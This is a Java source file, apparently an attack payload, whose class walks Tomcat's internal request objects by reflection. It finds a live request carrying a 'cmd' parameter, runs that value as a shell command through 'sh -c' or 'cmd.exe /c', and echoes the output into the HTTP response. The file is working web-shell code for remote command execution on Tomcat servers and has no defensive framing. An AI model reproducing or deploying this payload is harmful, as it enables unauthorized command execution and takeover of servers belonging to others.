package com.firebasky.echo.controller;

/**
 * 局限 数据大小/tomcat7
 */

public class Alltomcat  {
    public Alltomcat() {
        try{
            //传递命令的参数名
            String pass="cmd";
            //WebappClassLoaderBase
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

            //ApplicationContext
            org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);

            //StandardService
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

            //Connector
            org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();

            //筛选Connector
            for (int i=0;i<connectors.length;i++) {
                if (connectors[i].getScheme().contains("http")) {

                    //AbstractProtocol$ConnectoinHandler
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);
                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,null);

                    //RequestGroupInfo
                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);

                    //获取RequestGroupInfo中储存了RequestInfo的processors
                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);

                    //通过QueryString筛选
                    for (int k = 0; k < list.size(); k++) {
                        org.apache.coyote.RequestInfo requestInfo= (org.apache.coyote.RequestInfo) list.get(k);
                        if(requestInfo.getCurrentQueryString().contains(pass)){

                            //request
                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                            requestField.setAccessible(true);
                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);

                            //执行命令并回显
                            String cmd =request.getParameter(pass);
                            String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                            String output = s.hasNext() ? s.next() : "";
                            java.io.Writer writer = request.getResponse().getWriter();
                            java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                            usingWriter.setAccessible(true);
                            usingWriter.set(request.getResponse(), Boolean.FALSE);
                            writer.write(output);
                            writer.flush();

                            break;
                        }
                    }
                    break;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
